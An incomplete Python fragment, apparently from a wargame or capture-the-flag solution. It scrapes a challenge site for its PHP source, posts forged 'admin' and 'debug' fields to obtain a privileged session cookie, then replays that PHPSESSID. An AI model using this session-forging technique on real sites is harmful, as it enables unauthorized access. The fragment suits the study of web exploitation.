...
alt, source = find_element("a", soup, all=True)
source = source.attrs["href"]

alt_website = alt.attrs["href"]
...
php_path = extract_php_code(source_soup=source_soup, diff="source")

alt_response, alt_soup = send_get_request(website=alt_website, username=username, password=password)

alt, alt_source = find_element("a", soup, all=True)
alt_source = alt_source["href"]

alt_response, alt_soup = send_get_request(website=join_website_dir(alt_website, alt_source), username=username, password=password, get_body=False)

php_path = extract_php_code(source_soup=alt_soup, diff="alt")

# format file with Ctrl+Shift+P > Format Document

data = {"submit": "", "debug": "", "admin": "1"}
test_response, test_soup = send_post_request(website=alt_website, data=data, username=username, password=password, get_body=False)

php_id = test_response.cookies["PHPSESSID"]

data = {"debug": ""}
cookies = {"PHPSESSID": php_id}
final_response, final_soup = send_post_request(website=website, data=data, cookies=cookies, username=username, password=password, get_body=False)
